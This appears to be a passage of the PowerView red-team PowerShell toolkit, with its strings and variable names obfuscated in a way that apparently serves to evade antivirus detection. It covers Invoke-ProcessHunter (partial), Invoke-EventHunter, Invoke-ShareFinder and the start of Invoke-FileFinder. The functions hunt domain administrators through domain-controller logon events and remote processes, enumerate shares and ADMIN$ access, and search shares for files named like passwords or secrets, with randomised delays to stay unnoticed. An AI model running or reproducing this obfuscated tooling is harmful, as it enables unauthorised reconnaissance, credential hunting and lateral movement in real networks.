                    Write-Verbose ((HandleResult95 @(192,159,197,216,5,195,112,166,188,237,246,121,228,97,162,136,252,251,30,243,84,192,160,197,222,37,196,11) @(151,230,181,188,76,133,54)) + $Domain + (HandleResult95 @(55,244,236,91,75,118,100,79,208,132,123,81,124,81,67,142) @(126,179,182,45,40,31,38)))
                    $TargetUsers += Get-NetUser -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                        $_.samaccountname
                    }  | Where-Object {$_}
                }            
            }
            else {
                ForEach ($Domain in $ajPzEg) {
                    Write-Verbose ((HandleResult95 @(161,187,242,147,191,132,196,198,172,154,200,194,151,149,183,153,191,133,208,129,148,149,196,135,148,171,195,202) @(246,194,130,247)) + $Domain + (HandleResult95 @(5,7,170,230,47,41,178,161,47,114,166,233,47,57,178,230,22,41,178,254,47,45,201,161,47,3,177,254) @(76,64,240,144)) + $GroupName + "'")
                    $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController| Foreach-Object {
                        $_.MemberName
                    }
                }
            }

            if ((-not $ShowAll) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
                throw (HandleResult95 @(205,103,148,238,220,6,175,104,155,194,195,57,192,70,152,240,220,4,192,104,182,221,160,40,211,86,128,252,220,11,212,114,139,210,223,41,251,93,144,231,247,112,211,118) @(154,30,210,138,149,67))
            }
        }

        # script block that enumerates a server
        $h6EYtum2 = {
            param($ComputerName, $Ping, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword)

            # optionally check if the server is up first
            $yssh = $True
            if($Ping) {
                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($yssh) {
                # try to enumerate all active processes on the remote host
                # and search for a specific process name
                if($RemoteUserName -and $RemotePassword) {
                    $oWBV8 = Get-NetProcess -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -ComputerName $ComputerName -ErrorAction SilentlyContinue
                }
                else {
                    $oWBV8 = Get-NetProcess -ComputerName $ComputerName -ErrorAction SilentlyContinue
                }

                ForEach ($Process in $oWBV8) {
                    # if we're hunting for a process name or comma-separated names
                    if($ProcessName) {
                        $ProcessName.split(",") | ForEach-Object {
                            if ($Process.ProcessName -match $_) {
                                $Process
                            }
                        }
                    }
                    # if the session user is in the target list, display some output
                    elseif ($TargetUsers -contains $Process.User) {
                        $Process
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ((HandleResult95 @(176,147,165,182,29,120,56,129,175,172,174,6,79,12,160,160,138,145,74,123,18,174,175,155,162,56,114,60,130,140,131,191,37,66,29,141,168,146,135,70,92,26,219,246) @(230,203,235,198,127,21,91)) + $Threads)

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $O2kwi = @{
                'Ping' = $(-not $NoPing)
                'ProcessName' = $ProcessName
                'TargetUsers' = $TargetUsers
                'RemoteUserName' = $RemoteUserName
                'RemotePassword' = $RemotePassword
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose ((HandleResult95 @(88,28,179,94,242,201,93,19,167,125,253,252,70,34,246,11,217,216,69,9,160,83,249,249,85,12,129,82,226,188,93,21,167,87,238,232,110,34,250,64,223,199,66,83,138,123,134,178) @(15,101,195,58,187,143)) + $($ComputerName.count))
            $ypmBN = 0

            ForEach ($fa0ya in $ComputerName) {

                $ypmBN = $ypmBN + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose ((HandleResult95 @(56,238,46,244,38,210,8,229,11,192,111,252,12,250,24,160,14,192,107,254,38,223,16,252,12,249,4,252,12,254,31,173) @(111,151,94,144)) + $fa0ya + ([char]0x20+[char]0x28) + $ypmBN + (HandleResult95 @(158,48,86,18,87,252,174,234) @(215,119,111,127,30,189,147)) + $($ComputerName.count) + ")")
                $e9hz = Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $False, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword
                $e9hz

                if($e9hz -and $StopOnSuccess) {
                    Write-Verbose (HandleResult95 @(58,10,255,63,251,230,63,27,236,54,214,204,9,48,205,106,209,146,59,10,195,104,240,217,15,65,193,55,209,147,32,20,213,54,139,145,15,30,222,40,251,232,39,31,235,19,228,217,15,30,227,46,232,217,47,31,214,3,248,211,8,34,178,102) @(109,115,143,91,178,160))
                    return
                }
            }
        }

    }
}


function Invoke-EventHunter {
<#
    .SYNOPSIS

        Queries all domain controllers on the network for account
        logon events (ID 4624) and TGT request events (ID 4768),
        searching for target users.

        Note: Domain Admin (or equiv) rights are needed to query
        this information from the DCs.

        Author: @sixdub, @harmj0y
        License: BSD 3-Clause

    .PARAMETER ComputerName

        Host array to enumerate, passable on the pipeline.

    .PARAMETER ComputerFile

        File of hostnames/IPs to search.

    .PARAMETER ComputerFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER ComputerADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER GroupName

        Group name to query for target users.

    .PARAMETER TargetServer

        Hunt for users who are effective local admins on a target server.

    .PARAMETER UserName

        Specific username to search for.

    .PARAMETER UserFilter

        A customized ldap filter string to use for user enumeration, e.g. "(description=*admin*)"

    .PARAMETER UserADSpath

        The LDAP source to search through for users, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER UserFile

        File of usernames to search for.

    .PARAMETER NoPing

        Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Domain

        Domain for query for machines, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER SearchDays

        Number of days back to search logs for. Default 3.

    .PARAMETER SearchForest

        Switch. Search all domains in the forest for target users instead of just
        a single domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-EventHunter

    .LINK

        http://blog.harmj0y.net
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Int32]
        $SearchDays = 3,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $WLAr = New-Object System.Random

        Write-Verbose (HandleResult95 @(112,18,107,82,110,45,81,7,69,6,46,70,69,6,120,81,116,60,46,4,69,89,111,90,107,62,77,4,125,60,46,6,116,35,77,67,67,44,77,79) @(39,107,27,54))

        if($Domain) {
            $ajPzEg = @($Domain)
        }
        elseif($SearchForest) {
            # get ALL the domains in the forest to search
            $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            # use the local domain
            $ajPzEg = @( (Get-NetDomain).name )
        }

        #####################################################
        #
        # First we build the host target set
        #
        #####################################################

        if(!$ComputerName) { 
            # if we're using a host list, read the targets in and add them to the target list
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            elseif($ComputerFilter -or $ComputerADSpath) {
                [array]$ComputerName = @()
                ForEach ($Domain in $ajPzEg) {
                    Write-Verbose ((HandleResult95 @(205,5,203,222,135,244,65,171,38,227,240,251,211,80,175,18,242,253,156,196,101,205,58,203,216,167,243,58) @(154,124,187,186,206,178,7)) + $Domain + (HandleResult95 @(178,229,228,207,121,104,245,148,192,141,247,42,98,192,198,159) @(251,162,190,185,26,1,183)))
                    $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }
            else {
                # if a computer specifier isn't given, try to enumerate all domain controllers
                [array]$ComputerName = @()
                ForEach ($Domain in $ajPzEg) {
                    Write-Verbose ((HandleResult95 @(73,143,39,166,159,108,133,118,68,174,29,247,183,125,246,41,87,177,5,180,180,125,133,55,124,159,22,255) @(30,246,87,194,214,42,195,71)) + $Domain + (HandleResult95 @(214,217,106,26,12,232,221,245,82,94,94,233,254,201,4,11,54,179,166,235,84,36,37,247,253,217,72,0,12,239,210,163) @(159,158,48,108,111,129)))
                    $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (HandleResult95 @(59,19,172,15,169,40,71,238,12,128,34,25,206,5,241,94,28,249,57,160) @(111,126,148,104,200))
            }
        }

        #####################################################
        #
        # Now we build the user target set
        #
        #####################################################

        # users we're going to be searching for
        $TargetUsers = @()

        # if we want to hunt for the effective domain users who can access a target server
        if($TargetServer) {
            Write-Verbose ((HandleResult95 @(193,98,71,118,249,246,248,74,115,119,249,255,240,125,87,99,192,170,194,10,88,82,212,244,247,84,75,118,249,241,213,84) @(148,58,17,26,154,152)) + $TargetServer + (HandleResult95 @(159,0,15,72,131,230,48,42,71,166,236,19,20,114,150,178,29,21,107,141,182,23,0,24) @(213,121,77,37,225)))
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                ($_.AccountName).split("/")[1].toLower()
            }  | Where-Object {$_}
        }
        # if we get a specific username, only use that
        elseif($UserName) {
            Write-Verbose ((HandleResult95 @(213,154,218,51,34,0,236,248,130,253,98,5,15,242,208,139,201,58,15,42,222,193,161,155,52,89,16,195,203,160,201,106) @(130,227,170,87,107,70,186)) + $UserName + (HandleResult95 @(124,18,101,96,124,81,86,108) @(54,107,81,21,48)))
            $TargetUsers = @( $UserName.ToLower() )
        }
        # read in a target user list if we have one
        elseif($UserFile) {
            $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
        }
        elseif($UserADSpath -or $UserFilter) {
            ForEach ($Domain in $ajPzEg) {
                Write-Verbose ((HandleResult95 @(125,174,120,191,153,14,148,27,141,80,145,229,41,133,31,185,65,156,130,62,176,125,145,120,185,185,9,239) @(42,215,8,219,208,72,210)) + $Domain + (HandleResult95 @(161,66,41,176,130,61,170,52,16,244,183,45,139,114,78,251) @(232,5,115,198,225,84)))
                $TargetUsers += Get-NetUser -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                    $_.samaccountname
                }  | Where-Object {$_}
            }            
        }
        else {
            ForEach ($Domain in $ajPzEg) {
                Write-Verbose ((HandleResult95 @(246,155,76,19,102,231,164,13,45,119,235,215,93,32,26,207,171,123,37,89,195,181,122,7,77,200,163,1) @(161,226,60,119,47)) + $Domain + (HandleResult95 @(153,212,173,47,139,132,51,238,179,161,161,32,139,148,51,169,138,250,181,55,139,128,72,238,179,208,182,55) @(208,147,247,89,232,237,113,223)) + $GroupName + "'")
                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController | Foreach-Object {
                    $_.MemberName
                }
            }
        }

        if (((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw (HandleResult95 @(216,222,238,121,225,202,146,222,84,224,217,221,242,69,226,245,238,239,71,222,235,240,157,118,225,199,245,222,84,224,193,203,241,69,226,229,198,235,95,197,237,148,225,117) @(143,167,168,29,168))
        }

        # script block that enumerates a server
        $h6EYtum2 = {
            param($ComputerName, $Ping, $TargetUsers, $SearchDays)

            # optionally check if the server is up first
            $yssh = $True
            if($Ping) {
                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($yssh) {
                # try to enumerate 
                Get-UserEvent -ComputerName $ComputerName -EventType 'all' -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {
                    # filter for the target user set
                    $TargetUsers -contains $_.UserName
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ((HandleResult95 @(28,2,42,254,156,10,201,45,62,35,230,135,61,253,12,49,5,217,203,9,227,2,62,20,234,185,0,205,46,29,12,247,164,48,236,33,57,29,207,199,46,235,119,103) @(74,90,100,142,254,103,170)) + $Threads)

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $O2kwi = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'SearchDays' = $SearchDays
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose ((HandleResult95 @(22,187,245,81,55,7,144,243,81,57,7,177,204,114,75,112,160,210,127,18,34,171,199,67,36,40,128,237,108,77,19,178,225,88,43,38,163,194,12,4,37,138,200,3,55,0,255,184) @(65,194,133,53,126)) + $($ComputerName.count))
            $ypmBN = 0

            ForEach ($fa0ya in $ComputerName) {

                $ypmBN = $ypmBN + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose ((HandleResult95 @(219,164,120,63,224,99,112,249,185,95,106,197,69,75,202,237,105,12,156,72,111,196,147,100,56,199,124,74,239,180,73,102) @(140,221,8,91,169,38,38)) + $fa0ya + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $ypmBN + (HandleResult95 @(89,41,126,54,50,218,211,163) @(16,110,71,91,123,155,238,158)) + $($ComputerName.count) + ")")
                Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $(-not $NoPing), $TargetUsers, $SearchDays
            }
        }

    }
}


function Invoke-ShareFinder {
<#
    .SYNOPSIS

        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, then for
        each server it lists of active shares with Get-NetShare. Non-standard shares
        can be filtered out with -Exclude* flags.

        Author: @harmj0y
        License: BSD 3-Clause

    .PARAMETER ComputerName

        Host array to enumerate, passable on the pipeline.

    .PARAMETER ComputerFile

        File of hostnames/IPs to search.

    .PARAMETER ComputerFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER ComputerADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ExcludeStandard

        Switch. Exclude standard shares from display (C$, IPC$, print$ etc.)

    .PARAMETER ExcludePrint

        Switch. Exclude the print$ share.

    .PARAMETER ExcludeIPC

        Switch. Exclude the IPC$ share.

    .PARAMETER CheckShareAccess

        Switch. Only display found shares that the local user has access to.

    .PARAMETER CheckAdmin

        Switch. Only display ADMIN$ shares the local user has access to.

    .PARAMETER NoPing

        Switch. Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0.

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3.

    .PARAMETER Domain

        Domain to query for machines, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER SearchForest

        Switch. Search all domains in the forest for target users instead of just
        a single domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-ShareFinder -ExcludeStandard

        Find non-standard shares on the domain.

    .EXAMPLE

        PS C:\> Invoke-ShareFinder -Threads 20

        Multi-threaded share finding, replaces Invoke-ShareFinderThreaded.

    .EXAMPLE

        PS C:\> Invoke-ShareFinder -Delay 60

        Find shares on the domain with a 60 second (+/- *.3)
        randomized delay between touching each host.

    .EXAMPLE

        PS C:\> Invoke-ShareFinder -ComputerFile hosts.txt

        Find shares for machines in the specified hosts file.

    .LINK
    http://blog.harmj0y.net
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $ExcludeStandard,

        [Switch]
        $ExcludePrint,

        [Switch]
        $ExcludeIPC,

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,
 
        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $WLAr = New-Object System.Random

        Write-Verbose ((HandleResult95 @(195,53,156,194,189,210,6,221,196,153,161,60,142,203,151,243,31,187,147,198,246,126,152,202,184,194,2,131,255,172,222,32,190,203,152,225,22,171,240,141,221,4,136,214,144,211,43,139,252,179,194,63,181,254,159,243,46,222,255,147) @(148,76,236,166,244)) + $Delay)

        # figure out the shares we want to ignore
        [String[]] $ExcludedShares = @('')

        if ($ExcludePrint) {
            $ExcludedShares = $ExcludedShares + (HandleResult95 @(55,136,186,27,54,162,161,58) @(98,206,240,81))
        }
        if ($ExcludeIPC) {
            $ExcludedShares = $ExcludedShares + (HandleResult95 @(63,216,247,150,33,153,53,214) @(108,142,181,210,107,216,8,235))
        }
        if ($ExcludeStandard) {
            $ExcludedShares = @('', (HandleResult95 @(224,243,193,230,154,242,133,205) @(177,166,147,168,201,167)), (HandleResult95 @(225,109,7,137,106,145,143,6) @(178,59,69,205,32,208)), ([char]0x43+[char]0x24), (HandleResult95 @(128,156,217,209,79,185,139,248) @(213,218,147,155,27)))
        }

        if(!$ComputerName) { 

            if($Domain) {
                $ajPzEg = @($Domain)
            }
            elseif($SearchForest) {
                # get ALL the domains in the forest to search
                $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                # use the local domain
                $ajPzEg = @( (Get-NetDomain).name )
            }

            # if we're using a host file list, read the targets in and add them to the target list
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $ajPzEg) {
                    Write-Verbose ((HandleResult95 @(191,188,104,228,85,174,131,41,218,68,162,240,121,215,41,134,140,95,210,106,138,146,94,240,126,129,132,37) @(232,197,24,128,28)) + $Domain + (HandleResult95 @(173,136,117,138,193,184,166,160,77,207,236,225,135,184,18,193) @(228,207,47,252,162,209)))
                    $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.count) -eq 0) {
                throw (HandleResult95 @(187,191,125,34,192,19,214,168,33,13,236,51,181,191,124,116,195,57,190,186) @(239,210,69,69,161,84))
            }
        }

        # script block that enumerates a server
        $h6EYtum2 = {
            param($ComputerName, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)

            # optionally check if the server is up first
            $yssh = $True
            if($Ping) {
                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($yssh) {
                # get the shares for this host and check what we find
                $ID1uhNS = Get-NetShare -ComputerName $ComputerName
                ForEach ($AXZf4 in $ID1uhNS) {
                    Write-Debug ((HandleResult95 @(204,211,250,57,113,60,213,198,233,51,98,22,248,195,200,39,89,61,221,211,208,9,87,29) @(155,170,138,93,56,122)) + $AXZf4)
                    $UcLI9 = $AXZf4.shi1_netname
                    $NvOyk = $AXZf4.shi1_remark
                    $Path = '\\'+$ComputerName+'\'+$UcLI9

                    # make sure we get a real share name back
                    if (($UcLI9) -and ($UcLI9.trim() -ne '')) {
                        # if we're just checking for access to ADMIN$
                        if($CheckAdmin) {
                            if($UcLI9.ToUpper() -eq (HandleResult95 @(9,115,244,210,198,13,18,205) @(88,38,166,156,149))) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName + "\" + $UcLI9 + (HandleResult95 @(144,38,89,9,193,206,228,90) @(217,103,50,125,136,143)) + $NvOyk)
                                }
                                catch {
                                    Write-Debug ((HandleResult95 @(235,118,5,135,219,29,6,153,224,121,1,148,227,118,1,132,216,121,122,144,240,102,13,150,221,105,40,153) @(185,46,79,254)) + $Path + (HandleResult95 @(166,62,92,255) @(239,122,51,152,113)) + $_)
                                }
                            }
                        }
                        # skip this share if it's in the exclude list
                        elseif ($ExcludedShares -NotContains $UcLI9.ToUpper()) {
                            # see if we want to check access to this share
                            if($CheckShareAccess) {
                                # check if the user has access to this path
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName + "\" + $UcLI9 + (HandleResult95 @(249,255,223,103,118,240,52,120) @(176,190,180,19,63,177,9,69)) + $NvOyk)
                                }
                                catch {
                                    Write-Debug ((HandleResult95 @(215,12,177,222,40,101,204,51,162,240,4,60,223,12,181,221,43,1,176,58,178,239,8,62,225,19,156,192) @(133,84,251,167,74,86)) + $Path + (HandleResult95 @(139,252,28,36) @(194,184,115,67)) + $_)
                                }
                            }
                            else {
                                (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName + "\" + $UcLI9 + (HandleResult95 @(162,245,69,225,89,95,65,214) @(235,180,46,149,16,30,124)) + $NvOyk)
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ((HandleResult95 @(4,191,146,180,204,180,49,128,184,131,198,160,8,176,154,175,207,142,103,137,149,140,202,169,54,160,187,163,202,158,58,158,134,147,232,178,49,158,157,253,231,152,111,218) @(82,231,220,196,174,217)) + $Threads)

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $O2kwi = @{
                'Ping' = $(-not $NoPing)
                'CheckShareAccess' = $CheckShareAccess
                'ExcludedShares' = $ExcludedShares
                'CheckAdmin' = $CheckAdmin
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose ((HandleResult95 @(155,1,189,42,42,228,158,14,169,9,37,209,133,63,248,127,1,245,134,20,174,39,33,212,150,17,143,38,58,145,158,8,169,35,54,197,173,63,244,52,7,234,129,78,132,15,94,159) @(204,120,205,78,99,162)) + $($ComputerName.count))
            $ypmBN = 0

            ForEach ($fa0ya in $ComputerName) {

                $ypmBN = $ypmBN + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose ((HandleResult95 @(249,22,42,194,178,42,151,140,202,56,107,202,152,2,135,201,207,56,111,200,178,39,143,149,205,1,0,202,152,6,128,196) @(174,111,90,166,251,111,193,249)) + $fa0ya + ([char]0x20+[char]0x28) + $ypmBN + (HandleResult95 @(170,197,183,131,255,162,191,179) @(227,130,142,238,182)) + $($ComputerName.count) + ")")
                Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $False, $CheckShareAccess, $ExcludedShares, $CheckAdmin
            }
        }
        
    }
}


function Invoke-FileFinder {
<#
    .SYNOPSIS

        Finds sensitive files on the domain.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, grabs
        the readable shares for each server, and recursively searches every
        share for files with specific keywords in the name.
        If a share list is passed, EVERY share is enumerated regardless of
        other options.

    .PARAMETER ComputerName

        Host array to enumerate, passable on the pipeline.

    .PARAMETER ComputerFile

        File of hostnames/IPs to search.

    .PARAMETER ComputerFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER ComputerADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ShareList

        List if \\HOST\shares to search through.

    .PARAMETER Terms

        Terms to search for.

    .PARAMETER OfficeDocs

        Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

    .PARAMETER FreshEXEs

        Switch. Find .EXEs accessed within the last week.

    .PARAMETER LastAccessTime

        Only return files with a LastAccessTime greater than this date value.

    .PARAMETER LastWriteTime

        Only return files with a LastWriteTime greater than this date value.

    .PARAMETER CreationTime

        Only return files with a CreationDate greater than this date value.

    .PARAMETER IncludeC

        Switch. Include any C$ shares in recursive searching (default ignore).

    .PARAMETER IncludeAdmin

        Switch. Include any ADMIN$ shares in recursive searching (default ignore).

    .PARAMETER ExcludeFolders

        Switch. Exclude folders from the search results.

    .PARAMETER ExcludeHidden

        Switch. Exclude hidden files and folders from the search results.

    .PARAMETER CheckWriteAccess

        Switch. Only returns files the current user has write access to.

    .PARAMETER OutFile

        Output results to a specified csv output file.

    .PARAMETER NoClobber

        Switch. Don't overwrite any existing output file.

    .PARAMETER NoPing

        Switch. Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain

        Domain to query for machines, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER SearchForest

        Search all domains in the forest for target users instead of just
        a single domain.

    .PARAMETER SearchSYSVOL

        Switch. Search for login scripts on the SYSVOL of the primary DCs for each specified domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .PARAMETER UsePSDrive

        Switch. Mount target remote path with temporary PSDrives.

    .PARAMETER Credential

        Credential to use to mount the PSDrive for searching.

    .EXAMPLE

        PS C:\> Invoke-FileFinder

        Find readable files on the domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

    .EXAMPLE

        PS C:\> Invoke-FileFinder -Domain testing

        Find readable files on the 'testing' domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

    .EXAMPLE

        PS C:\> Invoke-FileFinder -IncludeC

        Find readable files on the domain with 'pass', 'sensitive',
        'secret', 'admin', 'login' or 'unattend*.xml' in the name,
        including C$ shares.

    .EXAMPLE

        PS C:\> Invoke-FileFinder -ShareList shares.txt -Terms accounts,ssn -OutFile out.csv

        Enumerate a specified share list for files with 'accounts' or
        'ssn' in the name, and write everything to "out.csv"

    .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/

#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $ShareList,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXEs,

        [String[]]
        $Terms,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $TermList,

        [String]
        $LastAccessTime,

        [String]
        $LastWriteTime,

        [String]
        $CreationTime,

        [Switch]
        $IncludeC,

        [Switch]
        $IncludeAdmin,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile,

        [Switch]
        $NoClobber,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [Switch]
        $SearchForest,

        [Switch]
        $SearchSYSVOL,

        [ValidateRange(1,100)] 
        [Int]
        $Threads,

        [Switch]
        $UsePSDrive,

        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $WLAr = New-Object System.Random

